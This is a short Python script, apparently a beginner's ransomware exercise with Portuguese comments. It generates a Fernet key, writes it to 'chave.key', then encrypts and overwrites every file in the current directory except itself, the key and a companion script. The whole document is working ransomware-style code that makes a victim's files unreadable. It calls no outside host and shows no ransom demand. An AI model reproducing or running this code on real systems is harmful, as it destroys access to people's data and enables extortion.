import os
from cryptography.fernet import Fernet

files = []

Key = Fernet.generate_key() #chave 

with open("chave.key","wb") as chave:
    chave.write(Key)

for file in os.listdir():
    if file == "arquivo1.py"  or file == "chave.key" or file == "arquivo2.py": # não inclua 
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

for file in files:
    with open(file,"r") as arquivo:
        conteudo = arquivo.read()
    conteudo_encrypted = Fernet(Key).encrypt(conteudo.encode())
    with open(file,"wb") as arquivo:
        arquivo.write(conteudo_encrypted)

